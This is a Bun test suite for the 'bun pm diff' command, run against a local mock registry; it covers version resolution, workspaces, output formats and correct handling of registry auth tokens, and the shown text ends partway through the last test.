import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { bunEnv, bunExe, isDebug, isRoot, isWindows, normalizeBunSnapshot, tempDir, tls } from "harness";
import { chmodSync, existsSync, readFileSync, readdirSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";

// Two versions of one small package, packed with `bun pm pack` and served from a
// local registry, so every mode of `bun pm diff` runs offline.
const v1 = {
  "package.json": JSON.stringify({ name: "diffme", version: "1.0.0", main: "index.js", scripts: { test: "echo ok" } }),
  "index.js": "module.exports = function () {\n  return 1;\n};\n",
  "README.md": "# diffme\n\nline a\nline b\nline c\nline d\nline e\nline f\nline g\nline h\n",
  "gone.txt": "only in v1\n",
};
const v2 = {
  "package.json": JSON.stringify({
    name: "diffme",
    version: "2.0.0",
    main: "dist/index.js",
    scripts: { test: "echo ok", postinstall: "node setup.js" },
    dependencies: { "left-pad": "^1.3.0" },
  }),
  "index.js": "module.exports = function () {\n  return 2;\n};\n",
  "README.md": "# diffme\n\nline a\nline b\nline c\nline d changed\nline e\nline f\nline g\nline h\n",
  "setup.js": "console.log('hi')\n",
  "logo.bin": Buffer.from([0, 1, 2, 3, 0, 255]),
};

let server: ReturnType<typeof Bun.serve>;
let registry: string;
let root: ReturnType<typeof tempDir>;
let tarballs: Record<string, string> = {};

// Packs `dir` into `dest` (outside the folder, so folder-side diffs do not see a stray tarball).
async function pack(dir: string, dest: string) {
  await using p = Bun.spawn({
    cmd: [bunExe(), "pm", "pack", "--quiet", "--destination", dest],
    cwd: dir,
    env: bunEnv,
    stdout: "pipe",
    stderr: "pipe",
  });
  const [, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
  const tgz = readdirSync(dest).find(f => f.endsWith(".tgz"));
  if (exitCode !== 0 || !tgz) throw new Error("pack failed: " + stderr);
  return join(dest, tgz);
}

beforeAll(async () => {
  root = tempDir("pm-diff", {
    "v1": v1,
    "v2": v2,
    "tgz1/.keep": "",
    "tgz2/.keep": "",
    "proj/package.json": JSON.stringify({ name: "proj", dependencies: { diffme: "1.0.0" } }),
  });
  tarballs["1.0.0"] = await pack(join(String(root), "v1"), join(String(root), "tgz1"));
  tarballs["2.0.0"] = await pack(join(String(root), "v2"), join(String(root), "tgz2"));
  server = Bun.serve({
    port: 0,
    async fetch(req) {
      const url = new URL(req.url);
      if (url.pathname === "/diffme") {
        const versions: any = {};
        for (const [v, files] of Object.entries({ "1.0.0": v1, "2.0.0": v2 })) {
          // Like in a real registry, each entry repeats the package.json that it was published with.
          versions[v] = {
            ...JSON.parse(files["package.json"]),
            dist: { tarball: `${registry}/diffme/-/diffme-${v}.tgz` },
          };
        }
        return Response.json({
          name: "diffme",
          "dist-tags": { latest: "2.0.0", next: "2.0.0", legacy: "1.0.0" },
          versions,
        });
      }
      const m = url.pathname.match(/^\/diffme\/-\/diffme-(.+)\.tgz$/);
      if (m && tarballs[m[1]]) return new Response(Bun.file(tarballs[m[1]]));
      // The dependencies of diffme@2.0.0, for the tests that install it.
      const leftPad = { name: "left-pad", version: "1.3.0" };
      if (url.pathname === "/left-pad") {
        const dist = { tarball: `${registry}/left-pad/-/left-pad-1.3.0.tgz` };
        return Response.json({
          name: "left-pad",
          "dist-tags": { latest: "1.3.0" },
          versions: { "1.3.0": { ...leftPad, dist } },
        });
      }
      if (url.pathname === "/left-pad/-/left-pad-1.3.0.tgz") {
        return new Response(await new Bun.Archive({ "package/package.json": JSON.stringify(leftPad) }).bytes("gzip"));
      }
      return new Response("Not Found", { status: 404 });
    },
  });
  registry = server.url.origin;
});
afterAll(() => {
  server?.stop(true);
  root?.[Symbol.dispose]();
});

async function diff(args: string[], cwd = String(root)) {
  await using p = Bun.spawn({
    cmd: [bunExe(), "pm", "diff", ...args],
    cwd,
    env: { ...bunEnv, NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry, NO_COLOR: "1" },
    stdout: "pipe",
    stderr: "pipe",
  });
  const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
  return { stdout, stderr, exitCode };
}

describe("bun pm diff", () => {
  test("two registry versions: summary, notable package.json changes, unified hunks", async () => {
    const { stdout, stderr, exitCode } = await diff(["diffme@1.0.0", "diffme@2.0.0"]);
    expect(stderr).toBe("");
    // (normalizeBunSnapshot flips backslashes to `/`, so the snapshot below shows the marker as `/ No newline…`.)
    expect(stdout).toContain("\\ No newline at end of file\n");
    expect(normalizeBunSnapshot(stdout, root)).toMatchInlineSnapshot(`
"diffme@1.0.0 → diffme@2.0.0

diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -3,7 +3,7 @@
 line a
 line b
 line c
-line d
+line d changed
 line e
 line f
 line g
diff --git a/gone.txt b/gone.txt
deleted file mode 100644
--- a/gone.txt
+++ /dev/null
@@ -1,1 +0,0 @@
-only in v1
diff --git a/index.js b/index.js
--- a/index.js
+++ b/index.js
@@ -1,3 +1,3 @@
 module.exports = function () {
-  return 1;
+  return 2;
 };
diff --bun a/logo.bin b/logo.bin
new file
Binary files differ (0 → 6 bytes, sha256 none → f186acff22c6)
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,8 +1,12 @@
 {
   "name": "diffme",
-  "version": "1.0.0",
-  "main": "index.js",
+  "version": "2.0.0",
+  "main": "dist/index.js",
   "scripts": {
-    "test": "echo ok"
+    "test": "echo ok",
+    "postinstall": "node setup.js"
+  },
+  "dependencies": {
+    "left-pad": "^1.3.0"
   }
 }
/ No newline at end of file
diff --git a/setup.js b/setup.js
new file mode 100644
--- /dev/null
+++ b/setup.js
@@ -0,0 +1,1 @@
+console.log('hi')

diffme@1.0.0 → diffme@2.0.0
3 files changed, 2 added, 1 removed  (+10 -6 lines)
  ! postinstall script added: node setup.js
  ! dependencies added: left-pad@^1.3.0
  ! main changed: index.js → dist/index.js
  ! new binary file logo.bin (6 bytes)"
`);
    expect(exitCode).toBe(0);
  });

  test("name@a..b and a bare second version mean the same thing", async () => {
    const a = await diff(["diffme@1.0.0", "diffme@2.0.0"]);
    const b = await diff(["diffme@1.0.0..2.0.0"]);
    const c = await diff(["diffme@1.0.0", "2.0.0"]);
    const d = await diff(["--diff=diffme@1.0.0", "--diff=diffme@2.0.0"]);
    expect(b.stdout).toBe(a.stdout);
    expect(c.stdout).toBe(a.stdout);
    expect(d.stdout).toBe(a.stdout);
  });

  test.each(["2", "^2", "~2.0", ">=2", "2.x", "1 || 2", "v2.0.0", "=2.0.0"])(
    "a bare second range (%s) reuses the first name",
    async range => {
      const named = await diff(["diffme@1.0.0", "diffme@2.0.0", "--name-only"]);
      expect(await diff(["diffme@1.0.0", range, "--name-only"])).toEqual(named);
      // After a folder it takes the folder's own name.
      const local = await diff(["./v1", "diffme@2.0.0", "--name-only"]);
      expect(await diff(["./v1", range, "--name-only"])).toEqual(local);
      expect(local.exitCode).toBe(0);
    },
  );

  test("a second argument that isn't a version is a package name", async () => {
    const { stdout, stderr, exitCode } = await diff(["diffme@1.0.0", "nosuchpackage"]);
    expect({ stdout, stderr: stderr.includes("nosuchpackage"), exitCode }).toEqual({
      stdout: "",
      stderr: true,
      exitCode: 1,
    });
  });

  test("--name-only and --stat", async () => {
    const names = await diff(["diffme@1.0.0", "2.0.0", "--name-only"]);
    expect(names.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual([
      "M README.md",
      "D gone.txt",
      "M index.js",
      "A logo.bin",
      "M package.json",
      "A setup.js",
    ]);
    const stat = await diff(["diffme@1.0.0", "2.0.0", "--stat"]);
    expect(stat.stdout).toContain(" README.md    |     2 +-");
    expect(stat.stdout).toContain(" logo.bin     | bin   0 → 6 bytes");
    expect(stat.stdout).not.toContain("@@");
  });

  test("':path' on a spec, a bare ':path', or trailing paths narrow the diff to those files", async () => {
    const only = (r: { stdout: string }) => r.stdout.split("\n").filter(l => /^[AMD] /.test(l));
    // spec suffix; a bare file name matches anywhere in the package
    expect(only(await diff(["diffme@1.0.0:index.js", "2.0.0", "--name-only"]))).toStrictEqual(["M index.js"]);
    // trailing args after both sides: an exact file and a glob
    expect(only(await diff(["diffme@1.0.0", "diffme@2.0.0", "gone.txt", "*.js", "--name-only"]))).toStrictEqual([
      "D gone.txt",
      "M index.js",
      "A setup.js",
    ]);
    // bare :path with the one-argument form
    expect(only(await diff(["diffme@1.0.0..2.0.0", ":package.json", "--name-only"]))).toStrictEqual(["M package.json"]);
    // nothing matches: an error, not an empty success
    const none = await diff(["diffme@1.0.0:nope.js", "2.0.0"]);
    expect(none.stderr).toContain("no file in either side matches nope.js");
    expect(none.exitCode).toBe(1);
  });

  test("-U changes the context around a hunk", async () => {
    const { stdout } = await diff(["diffme@1.0.0", "2.0.0", "-U", "1"]);
    expect(stdout).toContain("@@ -5,3 +5,3 @@\n line c\n-line d\n+line d changed\n line e\n");
  });

  test("one name: the version in this project's lockfile → latest", async () => {
    const proj = join(String(root), "proj");
    await using install = Bun.spawn({
      cmd: [bunExe(), "install"],
      cwd: proj,
      env: { ...bunEnv, NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, installErr, installExit] = await Promise.all([
      install.stdout.text(),
      install.stderr.text(),
      install.exited,
    ]);
    expect(installErr).not.toContain("error:");
    expect(installExit).toBe(0);
    const { stdout, exitCode } = await diff(["diffme", "--name-only"], proj);
    expect(stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(exitCode).toBe(0);
  });

  async function install(cwd: string) {
    await using p = Bun.spawn({
      cmd: [bunExe(), "install"],
      cwd,
      env: { ...bunEnv, NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(stderr).not.toContain("error:");
    expect(exitCode).toBe(0);
  }
  // The first line of the output: `left → right`, or the error.
  async function sides(cwd: string, ...args: string[]) {
    const { stdout, stderr } = await diff([...args, "--name-only"], cwd);
    return stdout.split("\n")[0] || stderr.trim();
  }
  const lockfiles = [
    ["bun.lock", '[install]\nlinker = "hoisted"\n'],
    ["bun.lockb", '[install]\nlinker = "hoisted"\nsaveTextLockfile = false\n'],
  ];

  test.each(lockfiles)(
    "one name in a workspace package: the version that package depends on (%s)",
    async (lockfile, bunfig) => {
      const member = (name: string, version?: string) =>
        JSON.stringify({ name, dependencies: version ? { diffme: version } : {} });
      using dir = tempDir("pm-diff-member", {
        "bunfig.toml": bunfig,
        "package.json": JSON.stringify({
          name: "root",
          workspaces: {
            packages: ["packages/*"],
            catalog: { diffme: "1.0.0" },
            catalogs: { two: { diffme: "2.0.0" } },
          },
        }),
        "packages/one/package.json": member("one", "1.0.0"),
        "packages/two/package.json": member("two", "2.0.0"),
        "packages/catalog-one/package.json": member("catalog-one", "catalog:"),
        "packages/catalog-two/package.json": member("catalog-two", "catalog:two"),
        "packages/none/package.json": member("none"),
      });
      await install(String(dir));
      expect(existsSync(join(String(dir), lockfile))).toBe(true);
      // A package that does not depend on it, and the root, load the copy in the root node_modules.
      const hoisted = JSON.parse(readFileSync(join(String(dir), "node_modules/diffme/package.json"), "utf8")).version;
      expect({
        one: await sides(join(String(dir), "packages/one"), "diffme"),
        two: await sides(join(String(dir), "packages/two"), "diffme"),
        "catalog-one": await sides(join(String(dir), "packages/catalog-one"), "diffme"),
        "catalog-two": await sides(join(String(dir), "packages/catalog-two"), "diffme"),
        none: await sides(join(String(dir), "packages/none"), "diffme"),
        root: await sides(String(dir), "diffme"),
      }).toEqual({
        one: "diffme@1.0.0 → diffme@2.0.0",
        two: "diffme@2.0.0 → diffme@2.0.0",
        "catalog-one": "diffme@1.0.0 → diffme@2.0.0",
        "catalog-two": "diffme@2.0.0 → diffme@2.0.0",
        none: `diffme@${hoisted} → diffme@2.0.0`,
        root: `diffme@${hoisted} → diffme@2.0.0`,
      });
    },
  );

  test.each(lockfiles)(
    "a bare name on the left means what the project installs under that name (%s)",
    async (lockfile, bunfig) => {
      using dir = tempDir("pm-diff-alias", {
        "bunfig.toml": bunfig,
        // The alias sorts before the name.
        "package.json": JSON.stringify({ name: "app", dependencies: { diffme: "2.0.0", aaa: "npm:diffme@1.0.0" } }),
      });
      const cwd = String(dir);
      await install(cwd);
      expect(existsSync(join(cwd, lockfile))).toBe(true);
      expect({
        "diffme": await sides(cwd, "diffme"),
        "aaa": await sides(cwd, "aaa"),
        "aaa@2.0.0": await sides(cwd, "aaa@2.0.0"),
        "diffme 1.0.0": await sides(cwd, "diffme", "1.0.0"),
        "aaa 2.0.0": await sides(cwd, "aaa", "2.0.0"),
        "aaa diffme": await sides(cwd, "aaa", "diffme"),
      }).toEqual({
        "diffme": "diffme@2.0.0 → diffme@2.0.0",
        "aaa": "diffme@1.0.0 → diffme@2.0.0",
        "aaa@2.0.0": "diffme@1.0.0 → diffme@2.0.0",
        "diffme 1.0.0": "diffme@2.0.0 → diffme@1.0.0",
        "aaa 2.0.0": "diffme@1.0.0 → diffme@2.0.0",
        "aaa diffme": "diffme@1.0.0 → diffme@2.0.0",
      });
    },
  );

  test("a bare name on the left that isn't in any lockfile means latest; a bare `latest` on the right is the tag", async () => {
    expect(await sides(String(root), "diffme", "1.0.0")).toBe("diffme@2.0.0 → diffme@1.0.0");
    expect(await sides(String(root), "diffme@1.0.0", "latest")).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(await sides(String(root), "./v1", "latest")).toBe("./v1 → diffme@2.0.0");
  });

  test("one folder: the registry side is named by that folder's package.json, not the project's", async () => {
    // From proj/ (name "proj") pointing at ../v1 (name "diffme"): must look up diffme@latest.
    const { stdout, exitCode } = await diff(["../v1", "--name-only"], join(String(root), "proj"));
    expect(stdout.split("\n")[0]).toBe("diffme@2.0.0 → ../v1");
    expect(exitCode).toBe(0);
  });

  test("a folder against a tarball, no registry involved", async () => {
    const { stdout, exitCode } = await diff(["./v1", tarballs["2.0.0"], "--name-only"]);
    expect(stdout.split("\n")[0]).toBe(`./v1 → ${tarballs["2.0.0"]}`);
    expect(stdout).toContain("A setup.js");
    expect(stdout).toContain("D gone.txt");
    expect(exitCode).toBe(0);
  });

  test("no arguments inside a package folder: what is published → this folder", async () => {
    const { stdout, exitCode } = await diff(["--name-only"], join(String(root), "v1"));
    const lines = stdout.split("\n");
    expect(lines[0]).toBe("diffme@2.0.0 → .");
    // 2.0.0 as published → v1 on disk: setup.js and logo.bin are gone from this side, gone.txt is back.
    expect(lines.filter(l => /^[AMD] /.test(l))).toEqual([
      "M README.md",
      "A gone.txt",
      "M index.js",
      "D logo.bin",
      "M package.json",
      "D setup.js",
    ]);
    expect(exitCode).toBe(0);
  });

  test("a workspace package's workspace: and catalog: versions are compared as `bun pm pack` publishes them", async () => {
    const manifest = (pkg: object) => JSON.stringify(pkg, null, 2) + "\n";
    const a = manifest({
      name: "ws-a",
      version: "1.0.0",
      dependencies: { "ws-b": "workspace:^", diffme: "catalog:" },
      devDependencies: { "ws-c": "workspace:2.x", "core": "workspace:ws-b@~" },
      peerDependencies: { "ws-b": "workspace:*", diffme: "catalog:legacy" },
      optionalDependencies: { "ws-d": "workspace:~", "ws-c": "workspace:../c" },
    });
    using dir = tempDir("pm-diff-workspace", {
      "package.json": manifest({
        name: "ws-root",
        version: "9.0.0",
        workspaces: {
          packages: ["packages/*"],
          catalog: { diffme: "^1.0.0" },
          catalogs: { legacy: { diffme: "1.0.0" } },
        },
        dependencies: { diffme: "catalog:", "ws-b": "workspace:^" },
      }),
      "packages/a/package.json": a,
      "packages/a/index.js": "module.exports = 1;\n",
      "packages/b/package.json": manifest({ name: "ws-b", version: "1.0.1" }),
      "packages/c/package.json": manifest({ name: "ws-c", version: "2.3.4" }),
      "packages/d/package.json": manifest({ name: "ws-d", version: "3.0.0" }),
      // The same files outside the `workspaces` globs: not a package of this project.
      "vendor/a/package.json": a,
      "vendor/a/index.js": "module.exports = 1;\n",
      "out/.keep": "",
      "out-root/.keep": "",
    });
    const member = join(String(dir), "packages", "a");
    const tgz = await pack(member, join(String(dir), "out"));

    // The versions pack just wrote are the ones this folder shows, from inside the package and from the root.
    expect(await diff([tgz, "."], member)).toEqual({
      stdout: `${tgz} → .\nNo differences (2 files)\n`,
      stderr: "",
      exitCode: 0,
    });
    expect(await diff([tgz, "./packages/a/"], String(dir))).toEqual({
      stdout: `${tgz} → ./packages/a/\nNo differences (2 files)\n`,
      stderr: "",
      exitCode: 0,
    });
    // An absolute path is used as typed.
    const roundabout = `${String(dir)}/packages/b/../a`;
    expect(await diff([tgz, roundabout], String(dir))).toEqual({
      stdout: `${tgz} → ${roundabout}\nNo differences (2 files)\n`,
      stderr: "",
      exitCode: 0,
    });
    // The root package itself. The filter is a base name: its own package.json and the five it packs along, which
    // are files like any other and stay as written on both sides.
    const rootTgz = await pack(String(dir), join(String(dir), "out-root"));
    expect((await diff([rootTgz, ".", "package.json"], String(dir))).stdout).toBe(
      `${rootTgz} → .\nNo differences (6 files)\n`,
    );

    // A folder that isn't one of the project's packages is compared as written. Nothing is taken from a workspace with
    // the same name.
    const vendored = await diff([tgz, "./vendor/a", "--json"], String(dir));
    expect(vendored.stderr).toBe("");
    const { files, notes } = JSON.parse(vendored.stdout);
    expect(files).toMatchObject([{ path: "package.json", linesAdded: 8, linesRemoved: 8 }]);
    expect(notes.sort()).toEqual([
      "dependencies diffme: ^1.0.0 → catalog:",
      "dependencies ws-b: ^1.0.1 → workspace:^",
      "optionalDependencies ws-c: 2.3.4 → workspace:../c",
      "optionalDependencies ws-d: ~3.0.0 → workspace:~",
      "peerDependencies diffme: 1.0.0 → catalog:legacy",
      "peerDependencies ws-b: 1.0.1 → workspace:*",
    ]);
    expect(vendored.exitCode).toBe(0);

    // Two folders compare as written, so the patch between them applies to the files on disk.
    expect(await diff(["./vendor/a", "./packages/a"], String(dir))).toEqual({
      stdout: "./vendor/a → ./packages/a\nNo differences (2 files)\n",
      stderr: "",
      exitCode: 0,
    });
  });

  test("a workspace: version that doesn't resolve, or a folder outside of any project, is left as written", async () => {
    const pkg = JSON.stringify({ name: "lonely", version: "1.0.0", dependencies: { gone: "workspace:^" } });
    using dir = tempDir("pm-diff-unresolved", {
      "project/package.json": pkg,
      "copy/package.json": pkg,
      "nowhere/sub/package.json": pkg,
    });
    for (const [cwd, folder] of [
      ["project", "."],
      ["nowhere", "./sub"],
    ]) {
      const { stdout, stderr, exitCode } = await diff([tarballs["1.0.0"], folder, "--json"], join(String(dir), cwd));
      expect(stderr).toBe("");
      expect(JSON.parse(stdout).notes).toContain("dependencies added: gone@workspace:^");
      expect(exitCode).toBe(0);
    }
  });

  test("patch output marks a side that ends without a newline", async () => {
    using dir = tempDir("pm-diff-nonl", {
      "a/package.json": `{"name":"x","version":"1.0.0"}`,
      "b/package.json": `{"name":"x","version":"1.0.1"}\n`,
      "b/min.js": `let a=1`,
    });
    const { stdout, exitCode } = await diff(["./a", "./b"], String(dir));
    expect(stdout).toContain(
      '-{"name":"x","version":"1.0.0"}\n\\ No newline at end of file\n+{"name":"x","version":"1.0.1"}\n',
    );
    expect(stdout).toContain("+let a=1\n\\ No newline at end of file\n");
    expect(exitCode).toBe(0);
  });

  test("an unparseable -U is an error, not a silent default", async () => {
    const { stderr, exitCode } = await diff(["diffme@1.0.0", "2.0.0", "-U", "lots"]);
    expect(stderr).toContain("invalid --unified value");
    expect(exitCode).toBe(1);
  });

  test("on a terminal: per-file headers, a line-number gutter, no patch syntax", async () => {
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "diffme@1.0.0", "2.0.0"],
      cwd: String(root),
      env: {
        ...bunEnv,
        NPM_CONFIG_REGISTRY: registry,
        BUN_CONFIG_REGISTRY: registry,
        NO_COLOR: undefined,
        FORCE_COLOR: "1",
      },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(stderr).toBe("");
    expect(raw).toContain("\x1b[");
    const text = raw.replace(/\x1b\[[0-9;]*[mK]/g, "");
    expect(text).toContain("diffme 1.0.0 → 2.0.0\n");
    expect(text).toContain("6 files  +10 -6  ·  2 new  ·  1 deleted\n");
    expect(text).toMatch(/\nREADME\.md ─+ \+1 -1\n/);
    expect(text).toMatch(/\ngone\.txt ─+ deleted -1\n/);
    expect(text).toMatch(/\nlogo\.bin ─+ binary 0 → 6 bytes, sha256 none → f186acff22c6\n/);
    expect(text).toContain("    5 │  line c\n    6 │- line d\n    6 │+ line d changed\n    7 │  line e\n");
    expect(text).not.toContain("@@");
    expect(text).not.toContain("+++");
    expect(exitCode).toBe(0);
  });

  test("identical sides say so", async () => {
    const { stdout, exitCode } = await diff(["diffme@2.0.0", "2.0.0"]);
    expect(stdout).toBe("diffme@2.0.0 → diffme@2.0.0\nNo differences (5 files)\n");
    expect(exitCode).toBe(0);
  });

  test("--json: one document with labels, per-file status/counts/patch, plain-text notes and totals", async () => {
    const { stdout, exitCode } = await diff(["diffme@1.0.0", "2.0.0", "--json"]);
    const j = JSON.parse(stdout);
    expect(j.from).toBe("diffme@1.0.0");
    expect(j.to).toBe("diffme@2.0.0");
    expect(j.files.map((f: any) => [f.path, f.status, f.linesAdded, f.linesRemoved])).toEqual([
      ["README.md", "modified", 1, 1],
      ["gone.txt", "deleted", 0, 1],
      ["index.js", "modified", 1, 1],
      ["logo.bin", "added", 0, 0],
      ["package.json", "modified", 7, 3],
      ["setup.js", "added", 1, 0],
    ]);
    expect(j.files.find((f: any) => f.path === "index.js").patch).toBe(
      "@@ -1,3 +1,3 @@\n module.exports = function () {\n-  return 1;\n+  return 2;\n };\n",
    );
    expect(j.files.find((f: any) => f.path === "logo.bin")).toMatchObject({ binary: true, bytesAfter: 6 });
    expect(j.notes).toEqual([
      "postinstall script added: node setup.js",
      "dependencies added: left-pad@^1.3.0",
      "main changed: index.js → dist/index.js",
      "new binary file logo.bin (6 bytes)",
    ]);
    expect(j.totals).toEqual({ files: 6, added: 2, deleted: 1, linesAdded: 10, linesRemoved: 6, formattingOnly: 0 });
    expect(exitCode).toBe(0);
  });

  test("a dist.tarball on another https host carries that host's own .npmrc line", async () => {
    // The same rule as `bun install`: the tarball's own `.npmrc` line, not the registry's token.
    const seen = { registry: [] as (string | null)[], cdn: [] as (string | null)[] };
    using cdn = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      tls,
      fetch(req) {
        seen.cdn.push(req.headers.get("authorization"));
        return new Response(Bun.file(tarballs["2.0.0"]));
      },
    });
    using authed = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch(req) {
        seen.registry.push(req.headers.get("authorization"));
        if (req.headers.get("authorization") !== "Bearer sekrit") return new Response("no", { status: 401 });
        const url = new URL(req.url);
        if (url.pathname === "/diffme") {
          return Response.json({
            name: "diffme",
            "dist-tags": { latest: "2.0.0" },
            versions: {
              "1.0.0": {
                name: "diffme",
                version: "1.0.0",
                dist: { tarball: `${authed.url.origin}/diffme/-/diffme-1.0.0.tgz` },
              },
              "2.0.0": {
                name: "diffme",
                version: "2.0.0",
                dist: { tarball: `${cdn.url.origin}/npm/diffme-2.0.0.tgz` },
              },
            },
          });
        }
        return new Response(Bun.file(tarballs["1.0.0"]));
      },
    });
    using dir = tempDir("pm-diff-cdn-line", {
      "ca.pem": tls.cert,
      "bunfig.toml": `[install]\nregistry = { url = "${authed.url.origin}/", token = "sekrit" }\ncafile = "ca.pem"\n`,
      ".npmrc": `//${cdn.url.host}/:_authToken=cdn-line\n`,
      "home/.gitkeep": "",
    });
    const home = join(String(dir), "home");
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "diffme@1.0.0", "2.0.0", "--name-only"],
      cwd: String(dir),
      env: {
        ...bunEnv,
        NO_COLOR: "1",
        HOME: home,
        USERPROFILE: home,
        XDG_CONFIG_HOME: home,
        NPM_CONFIG_USERCONFIG: undefined,
      },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(seen.cdn).toEqual(["Bearer cdn-line"]);
    expect(seen.registry.every(a => a === "Bearer sekrit")).toBe(true);
    expect(stderr).toBe("");
    expect(stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(exitCode).toBe(0);
  });

  test("the registry token is sent to the registry, never to a foreign dist.tarball host", async () => {
    // Registry A demands a bearer token and points 2.0.0's tarball at host B; B must not see the token.
    const seen = { a: [] as (string | null)[], b: [] as (string | null)[] };
    using foreign = Bun.serve({
      port: 0,
      fetch(req) {
        seen.b.push(req.headers.get("authorization"));
        return new Response(Bun.file(tarballs["2.0.0"]));
      },
    });
    using authed = Bun.serve({
      port: 0,
      fetch(req) {
        seen.a.push(req.headers.get("authorization"));
        if (req.headers.get("authorization") !== "Bearer sekrit") return new Response("no", { status: 401 });
        const url = new URL(req.url);
        if (url.pathname === "/diffme") {
          return Response.json({
            name: "diffme",
            "dist-tags": { latest: "2.0.0" },
            versions: {
              "1.0.0": {
                name: "diffme",
                version: "1.0.0",
                dist: { tarball: `${authed.url.origin}/diffme/-/diffme-1.0.0.tgz` },
              },
              "2.0.0": {
                name: "diffme",
                version: "2.0.0",
                dist: { tarball: `${foreign.url.origin}/stolen/diffme-2.0.0.tgz` },
              },
            },
          });
        }
        return new Response(Bun.file(tarballs["1.0.0"]));
      },
    });
    using dir = tempDir("pm-diff-auth", {
      "bunfig.toml": `[install]\nregistry = { url = "${authed.url.origin}/", token = "sekrit" }\n`,
    });
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "diffme@1.0.0", "2.0.0", "--name-only"],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: "1" },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(stderr).toBe("");
    expect(stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(seen.a.every(h => h === "Bearer sekrit")).toBe(true);
    expect(seen.a.length).toBeGreaterThanOrEqual(2);
    expect(seen.b).toEqual([null]);
    expect(exitCode).toBe(0);
  });

  test("dist-tags, ranges and open-ended a.. spellings resolve like install would", async () => {
    // (a bare second word is only reused as a version when it is one; `next` alone would be the package "next")
    const tag = await diff(["diffme@legacy", "diffme@next", "--name-only"]);
    expect(tag.stderr).toBe("");
    expect(tag.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    const range = await diff(["diffme@^1", "diffme@>=2 <3", "--name-only"]);
    expect(range.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    const openEnded = await diff(["diffme@1.0.0..", "--name-only"]);
    expect(openEnded.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    for (const r of [tag, range, openEnded]) expect(r.exitCode).toBe(0);
  });

  test("scoped packages use their scope's registry and token", async () => {
    // The default registry knows nothing about @priv/*; only the scope registry (with its own token) does.
    const hits: string[] = [];
    using scoped = Bun.serve({
      port: 0,
      fetch(req) {
        const url = new URL(req.url);
        hits.push(`${req.headers.get("authorization")} ${decodeURIComponent(url.pathname)}`);
        if (req.headers.get("authorization") !== "Bearer scopetok") return new Response("no", { status: 401 });
        if (decodeURIComponent(url.pathname) === "/@priv/diffme") {
          const versions: any = {};
          for (const v of ["1.0.0", "2.0.0"]) {
            versions[v] = {
              name: "@priv/diffme",
              version: v,
              dist: { tarball: `${scoped.url.origin}/@priv/diffme/-/diffme-${v}.tgz` },
            };
          }
          return Response.json({ name: "@priv/diffme", "dist-tags": { latest: "2.0.0" }, versions });
        }
        const m = url.pathname.match(/diffme-(.+)\.tgz$/);
        return m ? new Response(Bun.file(tarballs[m[1]])) : new Response("Not Found", { status: 404 });
      },
    });
    using dir = tempDir("pm-diff-scope", {
      "bunfig.toml": `[install.scopes]\n"@priv" = { url = "${scoped.url.origin}/", token = "scopetok" }\n`,
    });
    for (const args of [
      ["@priv/diffme@1.0.0", "2.0.0"],
      ["@priv/diffme@1.0.0..2.0.0"],
      ["@priv/diffme@1.0.0", "@priv/diffme@2.0.0"],
    ]) {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
        cwd: String(dir),
        env: { ...bunEnv, NO_COLOR: "1", NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      expect(stderr).toBe("");
      expect(stdout.split("\n")[0]).toBe("@priv/diffme@1.0.0 → @priv/diffme@2.0.0");
      expect(exitCode).toBe(0);
    }
    expect(hits.every(h => h.startsWith("Bearer scopetok "))).toBe(true);
    expect(hits.some(h => h.endsWith(" /@priv/diffme"))).toBe(true);
  });

  test("treats a name longer than the path buffer as a registry package", async () => {
    const { stderr, exitCode } = await diff([Buffer.alloc(5000, "x") + "@1.0.0", "2.0.0"]);
    expect(stderr).toContain("404");
    expect(exitCode).toBe(1);
  });

  test("errors: unknown package, no matching version; a third argument is a file filter", async () => {
    const unknown = await diff(["nope-nope@1.0.0", "2.0.0"]);
    expect(unknown.exitCode).toBe(1);
    expect(unknown.stderr).toContain("404");
    const nover = await diff(["diffme@9.9.9", "2.0.0"]);
    expect(nover.exitCode).toBe(1);
    expect(nover.stderr).toContain("no version of diffme matches 9.9.9");
    // …and what exists instead, newest first, plus the tags.
    expect(nover.stderr).toContain("recent versions: 2.0.0, 1.0.0");
